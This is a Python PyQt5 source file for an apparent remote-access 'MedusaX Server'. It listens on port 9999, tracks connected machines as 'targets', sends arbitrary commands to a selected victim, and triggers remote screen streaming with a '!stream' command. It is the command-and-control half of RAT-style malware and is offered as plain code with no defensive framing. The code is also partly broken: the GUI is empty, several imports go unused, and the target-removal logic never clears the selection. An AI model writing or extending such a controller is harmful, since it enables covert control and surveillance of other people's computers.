import socket
import threading
import os
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtGui import QImage, QPixmap

class Server(QWidget):
    def __init__(self):
        super().__init__()
        self.clients = {}
        self.current_client = None
        self.init_ui()
        self.start_server()

    def init_ui(self):
        self.setWindowTitle('MedusaX Server')
        self.setGeometry(100, 100, 800, 600)
        self.layout = QVBoxLayout()
        self.setLayout(self.layout)

    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(('0.0.0.0', 9999))
        self.server_socket.listen(5)
        threading.Thread(target=self.accept_clients).start()

    def accept_clients(self):
        while True:
            client_socket, client_address = self.server_socket.accept()
            self.clients[client_address] = client_socket
            if len(self.clients) == 1:
                self.current_client = client_socket
            threading.Thread(target=self.handle_client, args=(client_socket, client_address)).start()
            print(f"Client {client_address} connected")

    def handle_client(self, client_socket, client_address):
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                print(f"Received data from {client_address}: {data}")
            except Exception as e:
                print(f"Error handling client {client_address}: {e}")
                break

    def send_command(self, command):
        if self.current_client:
            self.current_client.sendall(command.encode('utf-8'))

    def set_target(self, client_address):
        if client_address in self.clients:
            self.current_client = self.clients[client_address]
            print(f"Target set to {client_address}")

    def remove_target(self, client_address):
        if client_address in self.clients:
            del self.clients[client_address]
            print(f"Removed target {client_address}")
            if self.current_client == self.clients.get(client_address):
                self.current_client = None

    def list_clients(self):
        print("Connected clients:")
        for client_address in self.clients:
            if self.current_client == self.clients[client_address]:
                print(f"{client_address} (selected)")
            else:
                print(client_address)

    def start_screen_sharing(self):
        if self.current_client:
            self.send_command('!stream')

if __name__ == "__main__":
    app = QApplication(sys.argv)
    server = Server()
    sys.exit(app.exec_())
